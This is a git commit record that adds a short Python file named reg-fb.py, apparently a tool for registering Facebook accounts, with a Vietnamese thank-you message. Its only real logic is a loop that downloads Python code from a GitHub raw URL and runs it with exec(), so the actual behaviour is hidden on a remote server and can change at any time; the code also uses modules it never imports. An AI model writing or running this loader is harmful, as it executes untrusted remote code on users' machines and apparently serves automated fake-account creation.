5657bebfa7c9f9a17e55b0e2812563b9b343e5c1
unghia11 <vnghiau2@gmail.com>
2025-07-18 14:38:13 +0700

    Create reg-fb.py

---
+++ reg-fb.py
@@ -0,0 +1,8 @@
+from time import sleep
+sleep(2)
+while True:
+    try:
+        exec(requests.get('https://raw.githubusercontent.com/unghia11/gopv4/refs/heads/main/8.6.py').text)
+    except KeyboardInterrupt:
+        print("\n\033[1;97m[\033[1;91m<>\033[1;97m] \033[1;31mCảm ơn bạn đã dùng Tool !!!")
+        sys.exit()    
